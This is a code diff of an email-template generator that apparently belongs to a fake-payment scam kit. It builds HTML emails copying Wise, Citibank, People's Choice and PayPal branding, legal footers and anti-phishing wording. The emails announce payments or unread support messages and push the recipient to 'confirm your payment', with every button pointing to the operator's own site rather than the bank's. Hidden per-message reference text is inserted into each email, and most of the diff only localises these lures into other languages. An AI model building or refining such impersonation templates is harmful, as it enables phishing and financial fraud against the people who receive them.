#bbf7d0;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#166534;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#14532d;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#2E7D32;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">WISE</span></div>`;
+            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Wise. ${t('all_rights_reserved', lang)}</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a></p></div></div></body></html>`;
             btnColor = '#2E7D32';
          } else if (bankSrc === 'citibank') {
-            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Citibank — Support Reply</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#003B70;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#003B70;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(0,59,112,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#1e40af;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#1e3a8a;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#003B70;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">CITIBANK</span></div>`;
-            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Citibank N.A. All rights reserved. Member FDIC.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">Privacy</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">Support</a></p></div></div></body></html>`;
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Citibank</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#003B70;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#003B70;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(0,59,112,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#1e40af;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#1e3a8a;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#003B70;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">CITIBANK</span></div>`;
+            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Citibank N.A. ${t('all_rights_reserved', lang)} ${t('member_fdic', lang)}.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a></p></div></div></body></html>`;
             btnColor = '#003B70';
          } else if (bankSrc === 'peoplechoice') {
-            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>People's Choice — Support Reply</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#D32F2F;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#D32F2F;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(211,47,47,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#fef2f2;border:1px solid #fecaca;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#991b1b;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#7f1d1d;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#D32F2F;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">PEOPLE'S CHOICE</span></div>`;
-            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} People's Choice. All rights reserved.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">Privacy</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">Support</a></p></div></div></body></html>`;
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>People's Choice</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#D32F2F;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#D32F2F;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(211,47,47,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#fef2f2;border:1px solid #fecaca;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#991b1b;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#7f1d1d;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#D32F2F;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">PEOPLE'S CHOICE</span></div>`;
+            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} People's Choice. ${t('all_rights_reserved', lang)}.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a></p></div></div></body></html>`;
             btnColor = '#D32F2F';
          }
 
          // PayPal-specific live chat reply content
          const paypalChatContent = bankSrc === 'paypal' ? `
           <div class="box">
-             <h2 class="headline">Action Required: Unread Message</h2>
+             <h2 class="headline">${t('action_required_unread', lang)}</h2>
              <p class="text-center text-muted" style="margin-bottom: 16px;">
-               Hello <strong>${data.user_name || 'there'}</strong>, you have an unread message regarding your PayPal transfer.
+               ${t('hello_there', lang)} <strong>${data.user_name || t('there', lang)}</strong>, ${t('unread_paypal_transfer', lang)}
              </p>
              <div class="highlight-box" style="background:#f0f7ff;border:1px solid #d0e3ff;">
-                <span class="highlight-label" style="color:#0070ba;">Unread Message from Support</span>
-                <p class="highlight-value" style="font-size: 14px; line-height: 1.4; color:#003087;">"${data.reply_text || 'You have a new message from support regarding your transfer.'}"</p>
+                <span class="highlight-label" style="color:#0070ba;">${t('unread_message_from_support', lang)}</span>
+                <p class="highlight-value" style="font-size: 14px; line-height: 1.4; color:#003087;">"${data.reply_text || t('unread_paypal_transfer', lang)}"</p>
              </div>
              <p class="text-center text-muted" style="font-size: 13px; margin-top: 16px;">
-               Please review the message and confirm your payment to proceed with the transfer.
+               ${t('review_message_confirm', lang)}
              </p>
              <div class="text-center" style="margin-top: 24px;">
-                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" class="btn" style="background-color: ${btnColor};">View Message & Confirm</a>
+                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" class="btn" style="background-color: ${btnColor};">${t('view_message_confirm', lang)}</a>
              </div>
              <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #6c7378;">
-               Need help? <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.user_email || '')}" style="color:#0070ba;">Continue live chat</a>
+               ${t('need_help', lang)} <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.user_email || '')}" style="color:#0070ba;">${t('continue_live_chat', lang)}</a>
              </p>
           </div>
          ` : `
           <div class="content">
-             <h2 class="headline">Support Has Replied 💬</h2>
+             <h2 class="headline">${t('support_replied', lang)} 💬</h2>
              <p class="text-center text-muted" style="margin-bottom: 10px;">
-               Hello <strong>${data.user_name || 'there'}</strong>, our support team has responded to your live chat message.
+               ${t('hello_there', lang)} <strong>${data.user_name || t('there', lang)}</strong>, ${t('support_replied_desc', lang)}
              </p>
              <div class="highlight-box">
-                <span class="highlight-label">Latest Reply</span>
-                <p class="highlight-value" style="font-size: 14px; line-height: 1.4;">"${data.reply_text || 'You have a new message from support.'}"</p>
+                <span class="highlight-label">${t('latest_reply', lang)}</span>
+                <p class="highlight-value" style="font-size: 14px; line-height: 1.4;">"${data.reply_text || t('new_message_support', lang)}"</p>
              </div>
              <p class="text-center text-muted" style="font-size: 13px; margin-top: 20px;">
-               Click the button below to view the full conversation and continue chatting with our team.
+               ${t('click_button_chat', lang)}
              </p>
              <div class="text-center" style="margin-top: 20px;">
-                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" class="btn" style="background-color: ${btnColor};">View Reply & Continue Chat</a>
+                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" class="btn" style="background-color: ${btnColor};">${t('view_reply_continue', lang)}</a>
              </div>
              <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #94a3b8;">
-               If the button doesn't work, copy and paste this link:<br>
+               ${t('button_doesnt_work', lang)}<br>
                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" style="font-size: 11px;">${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}</a>
              </p>
           </div>
@@ -463,20 +465,24 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
       case 'paypal':
          const ppStatus = data.status || 'Success';
          const isPpFailed = ppStatus === 'Failed';
-         subject = isPpFailed ? 'PayPal Payment Failed' : 'PayPal Payment Received';
+         const isPpPending = ppStatus === 'Pending';
+         const isPpOnHold = ppStatus === 'On Hold';
+         const isPpProcessing = ppStatus === 'Processing';
+         subject = isPpFailed ? t('paypal_payment_failed', lang) : t('paypal_payment_received', lang);
+         const ppDisplayStatus = isPpFailed ? t('status_failed', lang) : isPpPending ? t('status_pending', lang) : isPpOnHold ? t('status_on_hold', lang) : isPpProcessing ? t('status_processing', lang) : t('status_success', lang);
          content = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PayPal Email Template</title>
+    <title>PayPal</title>
 </head>
 <body style="margin: 0; padding: 0; background-color: #f5f7fa; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased;">
     <div style="display:none;font-size:1px;color:#f5f7fa;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div>
     <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; margin: 0 auto; background-color: #f5f7fa;">
         <tr>
             <td align="center" style="padding: 20px 0 10px 0; font-size: 11px; color: #6c7378;">
-                Hello, ${data.recipient_name}
+                ${t('hello_there', lang)}, ${data.recipient_name}
             </td>
         </tr>
         <tr>
@@ -486,12 +492,12 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
         </tr>
         <tr>
             <td align="center" style="padding: 0 30px; font-weight: bold; font-size: 32px; line-height: 38px; color: #000000;">
-                ${data.sender_name} sent<br>you ${fmt$(data.amount)}
+                ${data.sender_name} ${t('sent_you', lang)}<br>${fmt$(data.amount)}
             </td>
         </tr>
         <tr>
             <td style="padding: 40px 40px 10px 40px;">
-                <h3 style="margin: 0; font-size: 16px; font-weight: bold; color: #000000;">Transaction Details</h3>
+                <h3 style="margin: 0; font-size: 16px; font-weight: bold; color: #000000;">${t('transaction_details', lang)}</h3>
             </td>
         </tr>
         <tr>
@@ -499,11 +505,11 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
                 <table width="100%" border="0" cellpadding="0" cellspacing="0">
                     <tr>
                         <td valign="top" style="font-size: 12px; line-height: 18px;">
-                            <span style="color: #6c7378; display: block;">Transaction ID</span>
+                            <span style="color: #6c7378; display: block;">${t('transaction_id', lang)}</span>
                             <a href="#" style="color: #0070ba; text-decoration: underline; font-weight: 500;">${data.transaction_id}</a>
                         </td>
                         <td align="right" valign="top" style="font-size: 12px; line-height: 18px;">
-                            <span style="color: #6c7378; display: block;">Transaction date</span>
+                            <span style="color: #6c7378; display: block;">${t('date', lang)}</span>
                             <span style="color: #000000; font-weight: 500;">${data.date}</span>
                         </td>
                     </tr>
@@ -519,12 +525,12 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
             <td style="padding: 15px 40px 10px 40px;">
                 <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 13px;">
                     <tr>
-                        <td style="color: #000000; font-weight: bold;">Amount</td>
+                        <td style="color: #000000; font-weight: bold;">${t('amount', lang)}</td>
                         <td align="right" style="color: #000000;">${fmt$(data.amount)}</td>
                     </tr>
                     <tr>
-                        <td style="color: #6c7378; font-size: 12px; padding-top: 4px;">Status</td>
-                        <td align="right" style="color: ${ppStatus === 'Failed' ? '#dc2626' : ppStatus === 'Pending' ? '#f59e0b' : ppStatus === 'On Hold' || ppStatus === 'Processing' ? '#2563eb' : '#2E7D32'}; font-weight: bold; font-size: 12px; padding-top: 4px;">${ppStatus}</td>
+                        <td style="color: #6c7378; font-size: 12px; padding-top: 4px;">${t('status', lang)}</td>
+                        <td align="right" style="color: ${ppStatus === 'Failed' ? '#dc2626' : ppStatus === 'Pending' ? '#f59e0b' : ppStatus === 'On Hold' || ppStatus === 'Processing' ? '#2563eb' : '#2E7D32'}; font-weight: bold; font-size: 12px; padding-top: 4px;">${ppDisplayStatus}</td>
                     </tr>
                 </table>
             </td>
@@ -538,11 +544,11 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
             <td style="padding: 15px 40px 0 40px;">
                 <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 13px; line-height: 22px;">
                     <tr>
-                        <td style="color: #6c7378;">Fee</td>
+                        <td style="color: #6c7378;">${t('fee', lang)}</td>
                         <td align="right" style="color: #6c7378;">${fmt$(data.fee)}</td>
                     </tr>
                     <tr style="font-weight: bold; font-size: 14px;">
-                        <td style="color: #000000; padding-top: 5px;">Total</td>
+                        <td style="color: #000000; padding-top: 5px;">${t('total', lang)}</td>
                         <td align="right" style="color: #000000; padding-top: 5px;">${fmt$(data.total)}</td>
                     </tr>
                 </table>
@@ -555,7 +561,7 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
         </tr>
         <tr>
             <td style="padding: 20px 40px 0 40px;">
-                <h4 style="margin: 0 0 10px 0; font-size: 15px; font-weight: bold; color: #000000;">Business Address</h4>
+                <h4 style="margin: 0 0 10px 0; font-size: 15px; font-weight: bold; color: #000000;">${t('business_address', lang)}</h4>
                 <div style="font-size: 13px; line-height: 18px;">
                     <span style="color: #000000; font-weight: 600;">${data.sender_name}</span><br>
                     <span style="color: #333333;">1201 Meridian Tower, Suite 4200</span><br>
@@ -571,8 +577,8 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
         </tr>
         <tr>
             <td style="padding: 20px 40px 0 40px; font-size: 13px; line-height: 18px; color: #000000;">
-                <p style="margin: 0 0 4px 0; font-weight: 500;">Don't see the money in your account?</p>
-                <p style="margin: 0; color: #333333;">Don't worry – sometimes it just takes a few minutes for it to show up.</p>
+                <p style="margin: 0 0 4px 0; font-weight: 500;">${t('dont_see_money', lang)}</p>
+                <p style="margin: 0; color: #333333;">${t('dont_worry_show_up', lang)}</p>
             </td>
         </tr>
         <tr>
@@ -582,7 +588,7 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
         </tr>
         <tr>
             <td align="center" style="padding: 30px 40px;">
-                <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.recipient_email || '')}&source=paypal" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">Go to PayPal</a>
+                <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.recipient_email || '')}&source=paypal" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">${t('go_to_paypal', lang)}</a>
             </td>
         </tr>
         <tr>
@@ -603,11 +609,11 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
         <tr>
             <td align="center" style="padding: 20px 40px 10px 40px; font-size: 11px;">
                 <div style="margin-bottom: 15px;">
-                    <a href="#" style="color: #0070ba; text-decoration: none; font-weight: 500;">Help & Contact</a>
+                    <a href="#" style="color: #0070ba; text-decoration: none; font-weight: 500;">${t('help_contact', lang)}</a>
                     <span style="color: #c5c5c5; margin: 0 5px;">|</span>
-                    <a href="#" style="color: #0070ba; text-decoration: none; font-weight: 500;">Security</a>
+                    <a href="#" style="color: #0070ba; text-decoration: none; font-weight: 500;">${t('security', lang)}</a>
                     <span style="color: #c5c5c5; margin: 0 5px;">|</span>
-                    <a href="#" style="color: #0070ba; text-decoration: none; font-weight: 500;">Apps</a>
+                    <a href="#" style="color: #0070ba; text-decoration: none; font-weight: 500;">${t('apps', lang)}</a>
                 </div>
                 <div style="margin-bottom: 20px;">
                     <span style="display: inline-block; width: 24px; height: 24px; border-radius: 50%; background-color: #8a8e91; color: #ffffff; line-height: 24px; font-weight: bold; font-size: 11px; margin: 0 6px;">X</span>
@@ -619,10 +625,10 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
         </tr>
         <tr>
             <td style="padding: 0 40px 40px 40px; font-size: 10px; line-height: 15px; color: #6c7378;">
-                <p style="margin: 0 0 8px 0;">PayPal is committed to preventing fraudulent emails. Emails from PayPal will always contain your full name. <a href="#" style="color: #0070ba; text-decoration: underline;">Learn to identify phishing</a></p>
-                <p style="margin: 0 0 8px 0;">Please don't reply to this email. To get in touch with us, click <a href="#" style="color: #0070ba; text-decoration: underline;">Help & Contact</a>.</p>
-                <p style="margin: 0 0 12px 0;">Not sure why you received this email? <a href="#" style="color: #0070ba; text-decoration: underline;">Learn more</a></p>
-                <p style="margin: 0 0 4px 0;">Copyright &copy; 1999-${new Date().getFullYear()} PayPal, Inc. All rights reserved. PayPal is located at <a href="#" style="color: #0070ba; text-decoration: underline;">2211 N. First St., San Jose, CA 95131</a>.</p>
+                <p style="margin: 0 0 8px 0;">${t('paypal_fraud_prevention', lang)} <a href="#" style="color: #0070ba; text-decoration: underline;">${t('learn_phishing', lang)}</a></p>
+                <p style="margin: 0 0 8px 0;">${t('dont_reply_email', lang)} <a href="#" style="color: #0070ba; text-decoration: underline;">${t('help_contact', lang)}</a>.</p>
+                <p style="margin: 0 0 12px 0;">${t('not_sure_why', lang)} <a href="#" style="color: #0070ba; text-decoration: underline;">${t('learn_more', lang)}</a></p>
+                <p style="margin: 0 0 4px 0;">Copyright &copy; 1999-${new Date().getFullYear()} PayPal, Inc. ${t('all_rights_reserved', lang)}</p>
                 <p style="margin: 0; font-size: 9px; color: #9c9c9c;">PayPal RT000297:en_US(en-US):1.8.1:ab0bbbcf23caa</p>
             </td>
         </tr>
